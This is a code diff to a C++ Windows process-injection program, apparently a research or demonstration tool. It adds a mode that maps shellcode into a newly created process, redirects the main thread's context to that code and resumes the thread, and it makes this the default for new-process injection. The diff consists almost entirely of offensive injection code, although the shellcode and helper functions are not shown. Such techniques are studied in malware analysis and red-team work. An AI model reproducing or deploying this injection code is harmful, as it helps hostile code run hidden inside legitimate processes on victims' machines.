@@ -10,7 +10,8 @@
 typedef enum {
     ADD_THREAD,
     ADD_APC,
-    PATCH_EP
+    PATCH_EP,
+    PATCH_CONTEXT
 } INJECTION_POINT;
 
 using namespace std;
@@ -96,6 +97,11 @@ bool inject_in_new_process(INJECTION_POINT mode)
         paste_shellcode_at_ep(pi.hProcess, g_Shellcode, sizeof(g_Shellcode));
         ResumeThread(pi.hThread); //resume the main thread
         break;
+    case PATCH_CONTEXT:
+        remote_shellcode_ptr = map_code_into_process(pi.hProcess, g_Shellcode, sizeof(g_Shellcode));
+        patch_context(pi.hThread, remote_shellcode_ptr);
+        ResumeThread(pi.hThread); //resume the main thread
+        break;
     }
     
     //close handles
@@ -128,7 +134,7 @@ int main()
     if (inject_in_existing_process()) {
         printf("[SUCCESS] Code injected in existing process!\n");
     } else {
-        if (inject_in_new_process(INJECTION_POINT::ADD_THREAD)) {
+        if (inject_in_new_process(INJECTION_POINT::PATCH_CONTEXT)) {
              printf("[SUCCESS] Code injected in a new process!\n");
         }
     }
